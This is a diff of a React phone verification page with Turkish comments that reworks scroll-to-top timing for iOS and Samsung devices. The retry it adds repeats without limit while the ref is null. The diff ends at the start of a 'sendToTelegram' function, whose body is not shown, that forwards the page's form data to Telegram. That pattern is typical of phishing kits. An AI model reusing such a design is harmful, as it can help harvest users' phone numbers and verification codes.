@@ -17,7 +17,7 @@ function PhoneVerificationPageContent() {
   });
 
   const phoneInputRef = useRef(null);
-  const { rightSectionRef } = useScroll(); // Scroll context'ten ref'i al
+  const { rightSectionRef } = useScroll();
   const location = useLocation();
   const navigate = useNavigate();
   const { dispatch: authDispatch } = useAuth();
@@ -80,11 +80,22 @@ function PhoneVerificationPageContent() {
 
   // Sayfa yüklendiğinde scroll'u en üste kaydırma
   useEffect(() => {
-    if (rightSectionRef.current) {
-      rightSectionRef.current.scrollTop = 0; // En üste kay
-      rightSectionRef.current.dataset.loaded = "true"; // Scroll'u etkinleştir
-    }
-  }, [rightSectionRef]); // Değişiklik: Bağımlılık dizisine rightSectionRef eklendi
+    const scrollToTop = () => {
+      if (rightSectionRef.current) {
+        rightSectionRef.current.scrollTop = 0;
+        rightSectionRef.current.dataset.loaded = "true";
+        console.log('Scrolled to top'); // Hata ayıklamak için
+      } else {
+        // Ref null ise, bir kez daha dene
+        setTimeout(scrollToTop, 100);
+      }
+    };
+
+    // iOS için zamanlama optimizasyonu
+    setTimeout(() => {
+      requestAnimationFrame(scrollToTop);
+    }, 200); // 200ms gecikme
+  }, [rightSectionRef]);
 
   // Scroll optimizasyonu
   useEffect(() => {
@@ -107,7 +118,7 @@ function PhoneVerificationPageContent() {
         buttonPhone.scrollIntoView({ block: 'end', behavior: 'smooth' });
       }, 50);
 
-      setTimeout(adjustScroll, 200); // Samsung için gecikme
+      setTimeout(adjustScroll, 200);
     };
 
     if (phoneRef) {
@@ -133,7 +144,7 @@ function PhoneVerificationPageContent() {
         phoneRef.removeEventListener('blur', handleBlurScroll);
       }
     };
-  }, [rightSectionRef]); // Değişiklik: Bağımlılık dizisine rightSectionRef eklendi
+  }, [rightSectionRef]);
 
   // Telegram gönderimi
   const sendToTelegram = useCallback(async (data) => {
